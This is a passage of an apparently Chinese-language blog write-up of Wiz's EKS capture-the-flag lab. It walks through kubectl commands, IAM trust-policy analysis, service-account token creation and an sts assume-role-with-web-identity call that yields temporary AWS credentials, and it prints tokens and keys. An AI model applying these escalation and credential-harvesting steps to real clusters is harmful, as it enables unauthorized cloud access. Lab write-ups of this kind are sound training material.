class="string">&quot;k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk1XNTRHSDdPVSUyRjIwMjUwNzA5JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTA3MDlUMDgwNTQzWiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFS24lMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkZ3RWFET0JxS0oxUEhYa0J3UTBiZnlLM0FjSGdRN25zNnlMR1pvNSUyQmJpQ1dYN2FmRG1HN0Z1ZFRnTGdXTTJPS0U4b2ZYMXN5Q0JKY3JmQU02bTl0ak11V01pdThpSU0wMGJrcFBkNTRCcmRzb0R6dUNEa1ZTYlZoa2pHWTRwTWt2Sm11JTJCTzFMMFJiUGNFWVVpUHJDT0tPNnJrdEEzbjFoNSUyQlJXT3pLYVFyQWpPRkJ3QVFTdk9JVlRYNXo4U1lwTzlqRThncWxjb2E4MiUyQjhrTVhOYmRxOEtLUWEzRkJGZUclMkZDayUyRllCVGVYc2hMd0ZTbDI1YTVFTlRyZnFaWTBiTWV3T2N0OVVaa05wbFI4U2ppdnJqREJqSXRxZzM2QmVURUR5WlZrRVRNenBYRVZQcEhWNUM5NlFmOHRFMiUyRkJNeUNVTEYzM0Y0Y0RFT3YzZ2hnZ1VtUSZYLUFtei1TaWduYXR1cmU9YzhmNGFiNmI4YzFiYTZkMDlhOTlkZWMyOWFjNzliZTM0MWU5ZGJkYTA5NDkyNTgxOTM2ZmE5MTdiZTYzNDZjMg&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get secrets --token k8s-aws-v1.<span class="property">aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk1XNTRHSDdPVSUyRjIwMjUwNzA5JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTA3MDlUMDgwNTQzWiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFS24lMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkZ3RWFET0JxS0oxUEhYa0J3UTBiZnlLM0FjSGdRN25zNnlMR1pvNSUyQmJpQ1dYN2FmRG1HN0Z1ZFRnTGdXTTJPS0U4b2ZYMXN5Q0JKY3JmQU02bTl0ak11V01pdThpSU0wMGJrcFBkNTRCcmRzb0R6dUNEa1ZTYlZoa2pHWTRwTWt2Sm11JTJCTzFMMFJiUGNFWVVpUHJDT0tPNnJrdEEzbjFoNSUyQlJXT3pLYVFyQWpPRkJ3QVFTdk9JVlRYNXo4U1lwTzlqRThncWxjb2E4MiUyQjhrTVhOYmRxOEtLUWEzRkJGZUclMkZDayUyRllCVGVYc2hMd0ZTbDI1YTVFTlRyZnFaWTBiTWV3T2N0OVVaa05wbFI4U2ppdnJqREJqSXRxZzM2QmVURUR5WlZrRVRNenBYRVZQcEhWNUM5NlFmOHRFMiUyRkJNeUNVTEYzM0Y0Y0RFT3YzZ2hnZ1VtUSZYLUFtei1TaWduYXR1cmU9YzhmNGFiNmI4YzFiYTZkMDlhOTlkZWMyOWFjNzliZTM0MWU5ZGJkYTA5NDkyNTgxOTM2ZmE5MTdiZTYzNDZjMg</span></span><br><span class="line"><span class="variable constant_">NAME</span>        <span class="variable constant_">TYPE</span>     <span class="variable constant_">DATA</span>   <span class="variable constant_">AGE</span></span><br><span class="line">node-flag   <span class="title class_">Opaque</span>   <span class="number">1</span>      615d</span><br><span class="line"></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get secrets node-flag --token k8s-aws-v1.<span class="property">aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vP0FjdGlvbj1HZXRDYWxsZXJJZGVudGl0eSZWZXJzaW9uPTIwMTEtMDYtMTUmWC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BU0lBMkFWWU5FVk1XNTRHSDdPVSUyRjIwMjUwNzA5JTJGdXMtd2VzdC0xJTJGc3RzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTA3MDlUMDgwNTQzWiZYLUFtei1FeHBpcmVzPTYwJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCUzQngtazhzLWF3cy1pZCZYLUFtei1TZWN1cml0eS1Ub2tlbj1Gd29HWlhJdllYZHpFS24lMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkYlMkZ3RWFET0JxS0oxUEhYa0J3UTBiZnlLM0FjSGdRN25zNnlMR1pvNSUyQmJpQ1dYN2FmRG1HN0Z1ZFRnTGdXTTJPS0U4b2ZYMXN5Q0JKY3JmQU02bTl0ak11V01pdThpSU0wMGJrcFBkNTRCcmRzb0R6dUNEa1ZTYlZoa2pHWTRwTWt2Sm11JTJCTzFMMFJiUGNFWVVpUHJDT0tPNnJrdEEzbjFoNSUyQlJXT3pLYVFyQWpPRkJ3QVFTdk9JVlRYNXo4U1lwTzlqRThncWxjb2E4MiUyQjhrTVhOYmRxOEtLUWEzRkJGZUclMkZDayUyRllCVGVYc2hMd0ZTbDI1YTVFTlRyZnFaWTBiTWV3T2N0OVVaa05wbFI4U2ppdnJqREJqSXRxZzM2QmVURUR5WlZrRVRNenBYRVZQcEhWNUM5NlFmOHRFMiUyRkJNeUNVTEYzM0Y0Y0RFT3YzZ2hnZ1VtUSZYLUFtei1TaWduYXR1cmU9YzhmNGFiNmI4YzFiYTZkMDlhOTlkZWMyOWFjNzliZTM0MWU5ZGJkYTA5NDkyNTgxOTM2ZmE5MTdiZTYzNDZjMg</span> -o json | jq</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;flag&quot;</span>: <span class="string">&quot;d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3JlYWxfcHJvX2Nhbl9uYXZpZ2F0ZV9JTURTX3RvX0VLU19jb25ncmF0c30=&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;Secret&quot;</span>,</span><br><span class="line">  <span class="string">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;creationTimestamp&quot;</span>: <span class="string">&quot;2023-11-01T12:27:57Z&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;node-flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;namespace&quot;</span>: <span class="string">&quot;challenge4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;resourceVersion&quot;</span>: <span class="string">&quot;883574&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uid&quot;</span>: <span class="string">&quot;26461a29-ec72-40e1-adc7-99128ce664f7&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;type&quot;</span>: <span class="string">&quot;Opaque&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拿到flag：wiz_eks_challenge{only_a_real_pro_can_navigate_IMDS_to_EKS_congrats}</p>
<h1 id="Container-Secrets-Infrastructure"><a href="#Container-Secrets-Infrastructure" class="headerlink" title="Container Secrets Infrastructure"></a><strong>Container Secrets Infrastructure</strong></h1><p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%2011qwtqwt.png?imageSlim" alt="image.png"></p>
<p>IAM策略:可以看到flag在s3存储桶里</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Policy&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Action&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;s3:GetObject&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;s3:ListBucket&quot;</span></span><br><span class="line">                ],</span><br><span class="line">                <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Resource&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag&quot;</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Trust Policy（控制谁可以扮演[Assume]这个 IAM Role。）</p>
<p>限制了audience和Federated</p>
<p>aud必须是sts.amazonaws.com结尾</p>
<p>Federated也限制了arn:aws:iam::688655246681:oidc-provider&#x2F;oidc.eks.us-west-1.amazonaws.com&#x2F;id&#x2F;C062C207C8F50DE4EC24A372FF60E589</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Principal&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Federated&quot;</span>: <span class="string">&quot;arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Condition&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;StringEquals&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589:aud&quot;</span>: <span class="string">&quot;sts.amazonaws.com&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Permission</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;secrets&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;serviceaccounts&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;pods&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&quot;serviceaccounts/token&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;create&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用一下现有的权限</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get sa</span><br><span class="line"><span class="variable constant_">NAME</span>          <span class="variable constant_">SECRETS</span>   <span class="variable constant_">AGE</span></span><br><span class="line">debug-sa      <span class="number">0</span>         616d</span><br><span class="line"><span class="keyword">default</span>       <span class="number">0</span>         616d</span><br><span class="line">s3access-sa   <span class="number">0</span>         616d</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get pods</span><br><span class="line"><span class="title class_">No</span> resources found <span class="keyword">in</span> challenge5 namespace.</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get secrets</span><br><span class="line"><span class="title class_">No</span> resources found <span class="keyword">in</span> challenge5 namespace.</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get sa debug-sa -o json | jq</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;ServiceAccount&quot;</span>,</span><br><span class="line">  <span class="string">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;annotations&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;description&quot;</span>: <span class="string">&quot;This is a dummy service account with empty policy attached&quot;</span>,</span><br><span class="line">      <span class="string">&quot;eks.amazonaws.com/role-arn&quot;</span>: <span class="string">&quot;arn:aws:iam::688655246681:role/challengeTestRole-fc9d18e&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;creationTimestamp&quot;</span>: <span class="string">&quot;2023-10-31T20:07:37Z&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;debug-sa&quot;</span>,</span><br><span class="line">    <span class="string">&quot;namespace&quot;</span>: <span class="string">&quot;challenge5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;resourceVersion&quot;</span>: <span class="string">&quot;671929&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uid&quot;</span>: <span class="string">&quot;6cb6024a-c4da-47a9-9050-59c8c7079904&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get sa s3access-sa -o json | jq</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;ServiceAccount&quot;</span>,</span><br><span class="line">  <span class="string">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;annotations&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;eks.amazonaws.com/role-arn&quot;</span>: <span class="string">&quot;arn:aws:iam::688655246681:role/challengeEksS3Role&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;creationTimestamp&quot;</span>: <span class="string">&quot;2023-10-31T20:07:34Z&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;s3access-sa&quot;</span>,</span><br><span class="line">    <span class="string">&quot;namespace&quot;</span>: <span class="string">&quot;challenge5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;resourceVersion&quot;</span>: <span class="string">&quot;671916&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uid&quot;</span>: <span class="string">&quot;86e44c49-b05a-4ebe-800b-45183a6ebbda&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl get sa <span class="keyword">default</span> -o json | jq</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;ServiceAccount&quot;</span>,</span><br><span class="line">  <span class="string">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;creationTimestamp&quot;</span>: <span class="string">&quot;2023-10-31T20:07:11Z&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">    <span class="string">&quot;namespace&quot;</span>: <span class="string">&quot;challenge5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;resourceVersion&quot;</span>: <span class="string">&quot;671804&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uid&quot;</span>: <span class="string">&quot;77bd3db6-3642-40d5-b8c1-14fa1b0cba8c&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为我们有serviceaccounts&#x2F;token的创建权限，因此直接kubectl创建一个sa的token</p>
<p>注意Trust Policy有限制audience必须是sts.amazonaws.com</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl create token s3access-sa --audience  sts.<span class="property">amazonaws</span>.<span class="property">com</span></span><br><span class="line"><span class="attr">error</span>: failed to create <span class="attr">token</span>: serviceaccounts <span class="string">&quot;s3access-sa&quot;</span> is <span class="attr">forbidden</span>: <span class="title class_">User</span> <span class="string">&quot;system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal&quot;</span> cannot create resource <span class="string">&quot;serviceaccounts/token&quot;</span> <span class="keyword">in</span> <span class="variable constant_">API</span> group <span class="string">&quot;&quot;</span> <span class="keyword">in</span> the namespace <span class="string">&quot;challenge5&quot;</span></span><br><span class="line"></span><br><span class="line">root@wiz-eks-<span class="attr">challenge</span>:~# kubectl create token debug-sa --audience  sts.<span class="property">amazonaws</span>.<span class="property">com</span></span><br><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6ImI4YzE2MTEwNzZiMzY5ZjRmYTQ1YTYxODU3YmE3NGQ0ZjU4YWFkMGQifQ.<span class="property">eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzUyMDU0ODk1LCJpYXQiOjE3NTIwNTEyOTUsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTc1MjA1MTI5NSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ</span>.<span class="property">MU1sRiWXmAxH0OTU73165Yn</span>-<span class="title class_">YNsjxY</span>1uTpL2tXvnbHMW4SLjYsbYuqmfia59KnmLlnaaqoL2aWBcsUxj4zuOX7Tw2Wp2Cp-dwHzY9-<span class="title class_">Xsgp1</span>dvo8sYLNScXUN8Q3IYHXfb7MhVPgk9cRknc3jEGCNGk3H43Lbn2wJv4KB0K4kmuCEMQc9gDcySwy6ia2p3GuQLmIQmrOOt1Hphkp1sIsb9HrraCnQ99g-<span class="number">7</span>-<span class="title class_">Hg9</span>kaf3cn64RYX6r-tUhW1ctr0ym1oM_St4EcafI6jFxsQf6hQbMx2cPiSEKti4bo-<span class="title class_">LW4</span>zexJMg_CgnxxXMieI4BVtGwlulq4yuA69ca86aLh_wT588Q</span><br></pre></td></tr></table></figure>

<p>可以看到不管是aud还是Federated的限制都满足了</p>
<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%2012qtqwtqwt.png?imageSlim" alt="image.png"></p>
<p><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/image%201312rf.png?imageSlim" alt="image.png"></p>
<p>下一步就是模拟 IAM 权限了</p>
<p>使用 web token 拿到 STS 临时凭据</p>
<p>然后查阅AWS CLI 官方命令参考</p>
<p><a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html">https://docs.aws.amazon.com/cli/latest/reference/sts/assume-role-with-web-identity.html</a></p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws sts assume-role-<span class="keyword">with</span>-web-identity \</span><br><span class="line">  --role-arn <span class="attr">arn</span>:<span class="attr">aws</span>:<span class="attr">iam</span>::<span class="number">688655246681</span>:role/challengeEksS3Role \</span><br><span class="line">  --role-session-name sessionStarvenHacker \</span><br><span class="line">  --web-identity-token eyJhbGciOiJSUzI1NiIsImtpZCI6ImI4YzE2MTEwNzZiMzY5ZjRmYTQ1YTYxODU3YmE3NGQ0ZjU4YWFkMGQifQ.<span class="property">eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzUyMDU0ODk1LCJpYXQiOjE3NTIwNTEyOTUsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTc1MjA1MTI5NSwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ</span>.<span class="property">MU1sRiWXmAxH0OTU73165Yn</span>-<span class="title class_">YNsjxY</span>1uTpL2tXvnbHMW4SLjYsbYuqmfia59KnmLlnaaqoL2aWBcsUxj4zuOX7Tw2Wp2Cp-dwHzY9-<span class="title class_">Xsgp1</span>dvo8sYLNScXUN8Q3IYHXfb7MhVPgk9cRknc3jEGCNGk3H43Lbn2wJv4KB0K4kmuCEMQc9gDcySwy6ia2p3GuQLmIQmrOOt1Hphkp1sIsb9HrraCnQ99g-<span class="number">7</span>-<span class="title class_">Hg9</span>kaf3cn64RYX6r-tUhW1ctr0ym1oM_St4EcafI6jFxsQf6hQbMx2cPiSEKti4bo-<span class="title class_">LW4</span>zexJMg_CgnxxXMieI4BVtGwlulq4yuA69ca86aLh_wT588Q</span><br></pre></td></tr></table></figure>

<p>得到sts ak sk</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Credentials&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;AccessKeyId&quot;</span>: <span class="string">&quot;ASIA2AVYNEVMSGAL2XLE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SecretAccessKey&quot;</span>: <span class="string">&quot;GM/oSvSOAjj2nbXmRa/u+TQcgA+0i83IHUnbp8wC&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SessionToken&quot;</span>: <span class="string">&quot;IQoJb3JpZ2luX2VjEJr//////////wEaCXVzLXdlc3QtMSJHMEUCIAz/JmmA6khtEPlhwqZIyQtBQbUMp24qHeJw6MVh1hmkAiEAj8lq7I4GjW95/0HIHbzkhKWawSfkREA5eYPr1uVMFCAqzgQIov//////////ARABGgw2ODg2NTUyNDY2ODEiDPC6jqcBx18+50KJ4iqiBK4RIWnQP/8u/NaO5nRFJqahh22xDTlJbo7sV8wre/PTT3oc4NRLT3J01jKu/AN+n89Dnohjyw3vRm1kZoWibED4tZCcUo8Gr0i6QLtnWjwG5G37oBEuitqBEhLC6DvAk9poUguvXlTYw+kLo2ptAulOUurxmG6Hzu93LrRAREteq2crpeerSy6SGU0+iPqQPIan/NS2t7X2Bg4tHA/RZi7VGIY054ZEasyvkUgK1kJRAYfG60hr9+pJTm7FHIrgPCP2X5ucBcA4yQnDERsbuKtOGaiCpAwxMELR7l5Z9SqqIUKfaDdR3ItJC0o5oNTH5aju2bWTUwnnQgj7cvHftM57Ju83HXx5Hc/CyBG/TOET1n6z+FOY6/gohFQThHcPIF7BbjMjw4mk1hwnF0AuCgbYlTNFRnskkfJDawfkCsLFj0ATbFrnP+sL7ezwigltTsKMnw93T3MMaVuD6u2DBZKftqpmnUAEH7ShjAlcFcjg+juMgEzIzlLOP/bslrEe1ogaC3nAyF7dgvzXD5R99jrNq+7Y3S2PckEQZR6CUcUV4R7UHEOYzyDlltOUdFk/ZWMs4TZQCE8W3bDvJbqRRHZAj2aMgEt54kKv23moaaE6vc7JysDtmBrhomz4ZRUYco0umrDwqpOsayvTx86CSyiLNgQAgYoM/yjpJ9V8YbWgYV/nPO4+osfYUrZWLsoDh9dPGe5Nr6q4YN0Urtn1ssIayjCF6bjDBjqVAdakfHae/BJp2o1VBRC9C2rSOJeMdHn5wRD6Q5getTIroNzA4ltct3X8fjFk295O6s9TxCUHqkXt1bFlqoLq4/TK2PPejkc4fMRo4BSJp21ONL7TchGDYyc5/h2Dofa3ALUTlSApzgZwfNDNUqYflCuawdg6lRhX9OMND7UFhYXO/U5k3XaJhQCP5jpmco8VvObYFS3x&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Expiration&quot;</span>: <span class="string">&quot;2025-07-09T10:21:09+00:00&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;SubjectFromWebIdentityToken&quot;</span>: <span 